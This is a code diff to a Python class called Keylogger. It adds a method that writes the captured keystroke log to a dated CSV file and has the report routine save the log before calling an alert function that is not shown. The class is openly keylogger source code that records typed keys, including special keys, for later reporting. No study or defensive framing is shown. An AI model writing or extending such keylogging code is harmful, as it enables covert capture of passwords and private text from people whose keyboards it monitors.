@@ -77,8 +77,20 @@ class Keylogger:
                 name = f"[{name.upper()}]"
         self.log += name
 
+    def saveLog(self):
+        import csv
+        from datetime import date
+        fields = ['valor','frase']
+        rows = [['no', self.log]]
+        filename = "log_rec_"+str(date.today())+".csv"
+        with open(filename, 'w') as csvfile:
+            csvwriter = csv.writer(csvfile)
+            csvwriter.writerow(fields)
+            csvwriter.writerows(rows)
+
     def report(self):
         if self.log:
+            self.saveLog()
             sendAlert(self)
 
         self.log = ""
